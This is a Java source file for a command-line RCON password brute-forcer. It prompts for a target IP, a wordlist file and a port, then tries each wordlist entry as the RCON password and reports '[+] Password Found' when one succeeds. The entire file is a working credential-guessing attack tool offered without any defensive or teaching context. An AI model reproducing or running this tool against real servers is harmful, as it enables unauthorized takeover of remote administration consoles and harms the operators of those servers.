import con.Rcon;
import ex.AuthenticationException;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class brute {
    public static void main(String[] args) throws FileNotFoundException {
        Scanner scanner = new Scanner(System.in);
        System.out.print("Target: ");
        String ip = scanner.nextLine();
        System.out.print("Wordlist: ");
        String path = scanner.nextLine();
        Scanner wordlist = new Scanner(new File(path));
        System.out.print("Rcon-Port: ");
        int port = scanner.nextInt();
        List<String> list=new ArrayList<>();
        while(wordlist.hasNextLine()) {
            String line = wordlist.nextLine();
            try {
                Rcon rcon = new Rcon(ip, port, line.getBytes());
                System.out.println("[+] Password Found: " + line);
                break;
            } catch (AuthenticationException | IOException e) {
                System.out.println("[-] Password Incorrect: " + line);
            }
        }
    }
}
